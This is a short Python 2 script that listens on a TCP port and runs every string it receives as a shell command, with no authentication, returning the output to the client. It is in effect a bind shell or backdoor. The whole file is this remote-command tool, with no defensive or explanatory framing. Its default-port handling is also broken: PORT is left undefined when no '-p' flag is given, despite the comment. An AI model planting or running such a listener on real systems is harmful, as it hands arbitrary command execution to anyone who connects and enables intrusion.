import socket
import os
import sys
import subprocess

HOST = ''

'''
Command line arguments.
Default to port 5000
'''
if '-p' in sys.argv:
    try:
        PORT = int(sys.argv[sys.argv.index('-p') + 1])
    except:
        print "Invalid port input"
        PORT = 5000



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)
conn, addr = s.accept()

print 'Connected by: ', addr

while 1:
    data = conn.recv(1024)
    print data
    out = subprocess.check_output(data, shell=True)
    conn.sendall(out)

conn.close()


